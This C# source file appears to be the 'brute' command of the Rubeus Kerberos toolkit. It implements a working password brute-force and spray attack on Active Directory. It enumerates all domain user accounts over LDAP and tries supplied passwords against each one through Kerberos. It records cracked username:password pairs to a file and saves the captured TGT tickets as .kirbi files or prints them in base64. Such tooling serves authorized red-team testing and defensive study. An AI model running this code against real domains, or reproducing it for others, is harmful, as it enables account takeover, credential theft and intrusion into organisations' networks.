﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Collections;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace Rubeus.Commands
{
    public class Brute : ICommand
    {

        public static string CommandName => "brute";

        private string domain = "";
        private string[] usernames = null;
        private string[] passwords = null;
        private string dc = "";
        private string ou = "";
        private string credUser = "";
        private string credDomain = "";
        private string credPassword = "";
        private string outfile = "";
        private uint verbose = 0;
        private bool saveTickets = true;

        protected class BruteArgumentException : ArgumentException
        {
            public BruteArgumentException(string message)
            : base(message)
            {
            }
        }

        public void Execute(Dictionary<string, string> arguments)
        {
            try
            {
                this.ParseArguments(arguments);
                this.ObtainUsers();

                IBruteforcerReporter consoleReporter = new BruteforceConsoleReporter(
                    this.outfile, this.verbose, this.saveTickets);

                Bruteforcer bruter = new Bruteforcer(this.domain, this.dc, consoleReporter);
                bruter.Attack(this.usernames, this.passwords);
            }
            catch (BruteArgumentException ex)
            {
                Console.WriteLine("\r\n" + ex.Message + "\r\n");
            }
        }

        private void ParseArguments(Dictionary<string, string> arguments)
        {
            this.ParseDomain(arguments);
            this.ParseOU(arguments);
            this.ParseDC(arguments);
            this.ParseCreds(arguments);
            this.ParsePasswords(arguments);
            this.ParseUsers(arguments);
            this.ParseOutfile(arguments);
            this.ParseVerbose(arguments);
            this.ParseSaveTickets(arguments);
        }

        private void ParseDomain(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey("/domain"))
            {
                this.domain = arguments["/domain"];
            }
            else
            {
                this.domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
        }

        private void ParseOU(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey("/ou"))
            {
                this.ou = arguments["/ou"];
            }
        }

        private void ParseDC(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey("/dc"))
            {
                this.dc = arguments["/dc"];
            }
        }

        private void ParseCreds(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey("/creduser"))
            {
                if (!Regex.IsMatch(arguments["/creduser"], ".+\\.+", RegexOptions.IgnoreCase))
                {
                    throw new BruteArgumentException("[X] /creduser specification must be in fqdn format (domain.com\\user)");
                }

                string[] parts = arguments["/creduser"].Split('\\');
                this.credDomain = parts[0];
                this.credUser = parts[1];

                if (!arguments.ContainsKey("/credpassword"))
                {
                    throw new BruteArgumentException("[X] /credpassword is required when specifying /creduser");
                }

                this.credPassword = arguments["/credpassword"];
            }

        }

        private void ParsePasswords(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey("/passwords"))
            {
                this.passwords = File.ReadAllLines(arguments["/passwords"]);
            }
            else if (arguments.ContainsKey("/password"))
            {
                this.passwords = new string[] { arguments["/password"] };
            }
            else
            {
                throw new BruteArgumentException(
                    "[X] You must supply a password! Use /password:<password> or /passwords:<file>");
            }
        }

        private void ParseUsers(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey("/users"))
            {
                this.usernames = File.ReadAllLines(arguments["/users"]);
            }
            else if (arguments.ContainsKey("/user"))
            {
                this.usernames = new string[] { arguments["/user"] };
            }
        }

        private void ParseOutfile(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey("/outfile"))
            {
                this.outfile = arguments["/outfile"];
            }
        }

        private void ParseVerbose(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey("/verbose"))
            {
                this.verbose = 2;
            }
        }

        private void ParseSaveTickets(Dictionary<string, string> arguments)
        {
            if (arguments.ContainsKey("/noticket"))
            {
                this.saveTickets = false;
            }
        }

        private void ObtainUsers()
        {
            if(this.usernames == null)
            {
                this.usernames = this.DomainUsernames();
            }
            else
            {
                if(this.verbose == 0)
                {
                    this.verbose = 1;
                }
            }
        }

        private string[] DomainUsernames()
        {

            string domainController = this.DomainController();
            string bindPath = this.BindPath(domainController);
            DirectoryEntry directoryObject = new DirectoryEntry(bindPath);

            if (!String.IsNullOrEmpty(this.credUser))
            {
                string userDomain = String.Format("{0}\\{1}", this.credDomain, this.credUser);

                if (!this.AreCredentialsValid())
                {
                    throw new BruteArgumentException("[X] Credentials supplied for '" + userDomain + "' are invalid!");
                }
                
                directoryObject.Username = userDomain;
                directoryObject.Password = this.credPassword;

                Console.WriteLine("[*] Using alternate creds  : {0}\r\n", userDomain);
            }


            DirectorySearcher userSearcher = new DirectorySearcher(directoryObject);
            userSearcher.Filter = "(samAccountType=805306368)";
            userSearcher.PropertiesToLoad.Add("samAccountName");

            try
            {
                SearchResultCollection users = userSearcher.FindAll();

                ArrayList usernames = new ArrayList();

                foreach (SearchResult user in users)
                {
                    string username = user.Properties["samAccountName"][0].ToString();
                    usernames.Add(username);
                }

                return usernames.Cast<object>().Select(x => x.ToString()).ToArray();
            } catch(System.Runtime.InteropServices.COMException ex)
            {
                if((uint)ex.ErrorCode == 0x8007203A)
                {
                    throw new BruteArgumentException("[X] Error connecting with the dc \"" + domainController + "\"! Make sure that provided /domain or /dc are valid");
                }

                throw ex;
            }
        }

        private string DomainController()
        {
            string domainController = null;


            if (String.IsNullOrEmpty(this.dc))
            {
                if (!String.IsNullOrEmpty(this.domain))
                {
                    domainController = this.domain;
                }
                else
                {
                    domainController = Networking.GetDCName();

                    if(domainController == "")
                    {
                        throw new BruteArgumentException("[X] Unable to find DC address! Try it by providing /domain or /dc");
                    }
                }
            }
            else
            {
                domainController = this.dc;
            }

            return domainController;
        }

        private string BindPath(string domainController)
        {
            string bindPath = String.Format("LDAP://{0}", domainController);

            if (!String.IsNullOrEmpty(this.ou))
            {
                string ouPath = this.ou.Replace("ldap", "LDAP").Replace("LDAP://", "");
                bindPath = String.Format("{0}/{1}", bindPath, ouPath);
            }
            else if (!String.IsNullOrEmpty(this.domain))
            {
                string domainPath = this.domain.Replace(".", ",DC=");
                bindPath = String.Format("{0}/DC={1}", bindPath, domainPath);
            }

            return bindPath;
        }

        private bool AreCredentialsValid()
        {
            using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, this.credDomain))
            {
                return pc.ValidateCredentials(this.credUser, this.credPassword);
            }
        }

    }

    
    public class BruteforceConsoleReporter : IBruteforcerReporter
    {

        private uint verbose;
        private string passwordsOutfile;
        private bool saveTicket;

        public BruteforceConsoleReporter(string passwordsOutfile, uint verbose = 0, bool saveTicket = true)
        {
            this.verbose = verbose;
            this.passwordsOutfile = passwordsOutfile;
            this.saveTicket = saveTicket;
        }

        public void ReportValidPassword(string domain, string username, string password, byte[] ticket)
        {
            Console.WriteLine("[+] STUPENDOUS => {0}:{1}", username, password);
            this.WriteUserPasswordToFile(username, password);
            this.HandleTicket(username, ticket);
        }

        public void ReportValidUser(string domain, string username)
        {
            if (verbose > 0)
            {
                Console.WriteLine("[+] Valid user => {0}", username);
            }
        }

        public void ReportInvalidUser(string domain, string username)
        {
            if (this.verbose > 1)
            {
                Console.WriteLine("[-] Invalid user => {0}", username);
            }
        }

        public void ReportBlockedUser(string domain, string username)
        {
            Console.WriteLine("[-] Blocked/Disabled user => {0}", username);
        }

        public void ReportKrbError(string domain, string username, KRB_ERROR krbError)
        {
            Console.WriteLine("\r\n[X] {0} KRB-ERROR ({1}) : {2}\r\n", username, 
                    krbError.error_code, (Interop.KERBEROS_ERROR)krbError.error_code);
        }


        private void WriteUserPasswordToFile(string username, string password)
        {
            if (String.IsNullOrEmpty(this.passwordsOutfile))
            {
                return;
            }

            string line = String.Format("{0}:{1}{2}", username, password, Environment.NewLine);
            File.AppendAllText(this.passwordsOutfile, line);
        }

        private void HandleTicket(string username, byte[] ticket)
        {
            if(this.saveTicket)
            {
                string ticketFilename = username + ".kirbi";
                File.WriteAllBytes(ticketFilename, ticket);
                Console.WriteLine("[*] Saved TGT into {0}", ticketFilename);
            }
            else
            {
                this.PrintTicketBase64(username, ticket);
            }
        }

        private void PrintTicketBase64(string ticketname, byte[] ticket)
        {
            string ticketB64 = Convert.ToBase64String(ticket);

            Console.WriteLine("[*] base64({0}.kirbi):\r\n", ticketname);

            // display in columns of 80 chararacters
            foreach (string line in Helpers.Split(ticketB64, 80))
            {
                Console.WriteLine("      {0}", line);
            }

            Console.WriteLine("\r\n", ticketname);
        }

    }
}




